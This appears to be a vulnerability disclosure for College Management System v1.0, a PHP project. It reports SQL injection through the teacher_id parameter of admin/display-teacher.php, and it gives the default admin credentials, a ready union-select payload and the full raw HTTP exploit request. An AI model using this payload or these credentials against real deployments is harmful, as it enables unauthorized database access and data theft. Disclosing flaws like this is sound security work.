# College Management System v1.0 by oretnom23 has SQL injection

vendors: https://code-projects.org/college-management-system-in-php-with-source-code/

The password for the backend login account is: admin@gmail.com/admin123*

Vulnerability File: /College_Management_System/admin/display-teacher.php?teacher_id=

Vulnerability location: /College_Management_System/admin/display-teacher.php?teacher_id=, id

[+] Payload: /College_Management_System/admin/display-teacher.php?teacher_id=-2%27%20union%20select%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+

```sql
GET /College_Management_System/admin/display-teacher.php?teacher_id=-2%27%20union%20select%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qgju0bcshgm305hone8pah7cnf
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/167042387-fee226a1-b577-4f6b-91fc-c8b2f3367d97.png)

![image](https://user-images.githubusercontent.com/54017627/167042339-1a077faf-e71c-43fa-aab8-954477bfbcc4.png)
